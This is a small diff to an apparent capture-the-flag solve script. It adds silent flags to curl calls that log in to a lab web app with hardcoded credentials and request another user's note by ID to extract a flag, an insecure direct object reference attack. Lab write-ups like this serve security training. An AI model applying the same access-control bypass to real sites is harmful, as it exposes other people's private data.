@@ -12,7 +12,7 @@ attack_ip="10.10.30.237"
 mkdir /work/
 
 # Initiate session
-curl -X GET "http://$target_ip" -c "/work/cookie-bac.txt" -L > /dev/null
+curl -s -X GET "http://$target_ip" -c "/work/cookie-bac.txt" -L > /dev/null
 
 # Extract the PHPSESSID
 PHPSESSID=$(grep PHPSESSID "/work/cookie-bac.txt" | awk '{print $7}')
@@ -28,12 +28,12 @@ echo "Session iniated. PHPSESSID: $PHPSESSID"
 
 # Authenticate
 echo "Authenticating and capturing PHPSESSID..."
-curl -X POST "http://$target_ip" -b /work/cookie-bac.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "user=noot" -d"pass=test1234" > /dev/null
+curl -s -X POST "http://$target_ip" -b /work/cookie-bac.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "user=noot" -d"pass=test1234" > /dev/null
 
 
 # Use the PHPSESSID for the next HTTP request
 echo "Fetching protected resource..."
-curl -X GET "http://$target_ip/note.php?note_id=0" -b /work/cookie-bac.txt -H "Content-Type: application/json" -o /work/bac-flag.html -L
+curl -s -X GET "http://$target_ip/note.php?note_id=0" -b /work/cookie-bac.txt -H "Content-Type: application/json" -o /work/bac-flag.html -L
 sed -n 's/.*<pre>\(.*{.*}\)<\/pre>.*/\1/p' /work/bac-flag.html
 
 # Clean up
